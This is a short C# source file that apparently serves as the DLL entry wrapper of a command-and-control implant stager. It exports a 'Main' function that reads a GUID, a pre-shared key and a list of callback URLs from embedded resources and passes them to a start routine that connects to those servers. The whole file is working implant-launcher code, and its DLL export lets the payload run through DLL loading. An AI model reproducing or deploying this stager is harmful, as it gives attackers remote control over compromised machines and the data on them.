using Naga;
using NagaDll.Properties;
using RGiesecke.DllExport;
using System;
using System.Runtime.InteropServices;

namespace NagaDll
{
    [ComVisible(true)]
    public class Class
    {
        [DllExport(ExportName = "Main")]
        static void Main(string[] args)
        {

            string _guid = Resources.ResourceManager.GetString("GUID").ToString();
            string _psk = Resources.ResourceManager.GetString("PSK").ToString();
            string[] _urls = Resources.ResourceManager.GetString("URLs").ToString().Split('|')[0].Split(',');

#if DEBUG
            Console.WriteLine("[*] Found info in embedded resources:");
            Console.WriteLine("\t- GUID: {0}", _guid);
            Console.WriteLine("\t- PSK: {0}", _psk);
            Console.WriteLine("\t- URLS: {0}", String.Join(",", _urls));
#endif
            ST.Start(_guid, _psk, _urls);
        }
    }
}
